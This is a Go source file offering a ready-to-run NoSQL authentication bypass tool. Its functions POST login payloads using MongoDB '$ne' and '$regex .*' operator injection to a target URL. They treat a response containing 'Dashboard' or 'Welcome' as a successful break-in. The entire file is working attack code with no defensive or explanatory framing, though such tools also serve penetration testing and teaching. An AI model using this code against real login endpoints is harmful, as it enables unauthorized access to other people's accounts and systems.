package auth_bypass

import (
"bytes"
"encoding/json"
"io"
"net/http"
"strings"
)

type NoSQLAuthBypass struct {
URL    string
Client *http.Client
}

func NewNoSQLAuthBypass(url string) *NoSQLAuthBypass {
return &NoSQLAuthBypass{
URL:    url,
Client: &http.Client{},
}
}

func (n *NoSQLAuthBypass) BypassWithNe(username, password string) (bool, error) {
payload := map[string]interface{}{
"username": map[string]string{"$ne": username},
"password": map[string]string{"$ne": password},
}
body, _ := json.Marshal(payload)
resp, err := http.Post(n.URL, "application/json", bytes.NewBuffer(body))
if err != nil {
return false, err
}
defer resp.Body.Close()
data, _ := io.ReadAll(resp.Body)
content := string(data)
return strings.Contains(content, "Dashboard") || strings.Contains(content, "Welcome") || strings.Contains(content, "200 OK"), nil
}

func (n *NoSQLAuthBypass) BypassWithRegex(username, password string) (bool, error) {
payload := map[string]interface{}{
"username": map[string]string{"$regex": ".*"},
"password": map[string]string{"$regex": ".*"},
}
body, _ := json.Marshal(payload)
resp, err := http.Post(n.URL, "application/json", bytes.NewBuffer(body))
if err != nil {
return false, err
}
defer resp.Body.Close()
data, _ := io.ReadAll(resp.Body)
content := string(data)
return strings.Contains(content, "Dashboard") || strings.Contains(content, "Welcome") || strings.Contains(content, "200 OK"), nil
}

func (n *NoSQLAuthBypass) DumpAll(username, password string) (bool, error) {
if ok, _ := n.BypassWithNe(username, password); ok {
return true, nil
}
return n.BypassWithRegex(username, password)
}
